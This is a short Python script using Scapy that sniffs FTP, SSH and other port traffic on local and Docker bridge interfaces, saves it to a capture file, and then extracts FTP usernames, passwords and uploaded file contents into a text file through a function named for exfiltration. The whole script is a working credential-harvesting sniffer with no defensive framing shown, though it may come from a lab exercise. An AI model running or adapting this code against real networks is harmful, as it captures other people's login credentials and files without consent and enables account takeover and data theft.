#!/usr/bin/python3
from scapy.all import *

interfaces = ["eth0", "lo", "br-5553900d8119", ""]
capture = sniff(iface=interfaces, filter="port 21 or (portrange 21100-21110) or port 22 or (portrange 30000-30009)", count=90)
wrpcap("capturestocker.pcap", capture)

def parse_pcap(capture_file):
    packets = rdpcap(capture_file)
    raw_data_list = []

    for packet in packets:
        print(packet.summary())
        
        if Raw in packet:
            raw_data = packet[Raw].load.decode('utf-8')

            if raw_data.startswith('USER'):
                username = raw_data.split(' ')[1].strip()
                raw_data_list.append(f'Username: {username}')
                raw_data_list.append('\n')

            elif raw_data.startswith('PASS'):
                password = raw_data.split(' ')[1].strip()
                raw_data_list.append(f'Password: {password}')
                raw_data_list.append('\n')

            elif raw_data.startswith('STOR'):
                filename = raw_data.split(' ')[1].strip()
                raw_data_list.append(f'File: {filename}')
                raw_data_list.append('---Start of File Content---')

                for next_packet in packets[packets.index(packet) + 1:]:
                    if Raw in next_packet:
                        next_raw_data = next_packet[Raw].load.decode('utf-8')
                        if next_raw_data.startswith('STOR'):
                            break
                        elif not next_raw_data.startswith(('150', '226', '200', 'TYPE', 'PASV', '227')):
                            raw_data_list.append(next_raw_data)
                raw_data_list.append('---End of File Content---')
                raw_data_list.append('\n')

            print(f"Raw Data: {raw_data}")

    return raw_data_list

def exifiltr_data(raw_data_list):
    with open("FTP_rawdata.txt", "w") as w:
        for data in raw_data_list:
            cleaned_data = data.strip("b'\n")
            w.write(cleaned_data + '\n')

def read_data():
    with open("FTP_rawdata.txt", "r") as r:
        read_data_lines = r.readlines()

    return read_data_lines

if __name__ == "__main__":
    packets = parse_pcap("capturestocker.pcap")
    exifiltr_data(packets)  
    read_data()
    print("\r"+"#" * 50 + "\n")
    
